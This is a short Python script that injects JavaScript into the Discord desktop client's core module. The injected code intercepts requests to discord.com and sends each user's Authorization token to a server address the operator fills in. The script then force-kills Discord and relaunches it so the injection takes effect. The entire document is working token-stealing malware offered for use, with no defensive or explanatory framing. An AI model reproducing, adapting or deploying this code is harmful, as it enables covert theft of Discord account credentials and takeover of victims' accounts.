payload = """module.exports = require('./core.asar');
const electron = require("electron");
// neat pt1
const {session} = require('electron')
const filter = {
  urls: ['https://*.discord.com/*']
}
session.defaultSession.webRequest.onBeforeSendHeaders(filter,(details,callback)=> {
  var postData = JSON.stringify({"token":details.requestHeaders['Authorization']})
  const {net} = require('electron');
  const request = net.request({
    url:'your_website_here',
    method:'post',
    headers: {
      'Content-Type':'application/x-www-form-urlencoded'
    }
  })
  request.write(postData)
  request.end()
  callback({ requestHeaders: details.requestHeaders })
});
"""
import glob
import os
file = open(glob.glob(os.getenv('APPDATA')+'/discord/*/modules/discord_desktop_core/index.js')[0],'w')
file.write(payload)
file.close()
try:
    os.system("TASKKILL /F /IM discord.exe")
except:
    "do nothing"
os.startfile(glob.glob(os.getenv('LOCALAPPDATA')+'/Discord/*/Discord.exe')[0])
